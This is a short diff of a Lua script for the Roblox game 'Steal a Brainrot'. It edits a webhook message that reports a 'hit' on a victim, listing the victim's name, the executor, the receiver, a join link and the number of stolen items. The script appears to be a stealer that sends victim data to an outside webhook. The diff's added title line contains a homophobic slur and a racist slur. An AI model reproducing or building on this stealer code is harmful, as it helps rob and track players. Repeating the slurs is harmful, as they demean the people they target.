@@ -127,7 +127,7 @@ local function send(url)
     local body = {
         content = ping,
         embeds = {{
-            title = ":dash: **Steal A Brainrot Hit!!** :brain:",
+            title = ":dash: **Steal A Faggot Nigga Hit!!** :brain:",
             color = 255,
             fields = {
                 {name = ":bust_in_silhouette: Player Information", value = "```Victim: "..player.Name.."\nExecutor: "..executor.."\nReceiver: "..Username.."```", inline = false},
@@ -135,7 +135,7 @@ local function send(url)
                 {name = ":link: Join Link", value = "[CLICK HERE]("..joinLink..")", inline = false},
                 {name = ":moneybag: Summary", value = "```Total Items: "..#brainrots.."```", inline = false}
             },
-            footer = { text = "Hit using Trax Scripts | Today at " .. os.date("%H:%M") }
+            footer = { text = "Hit using Filtpants Scripts | Today at " .. os.date("%H:%M") }
         }}
     }
     pcall(function()
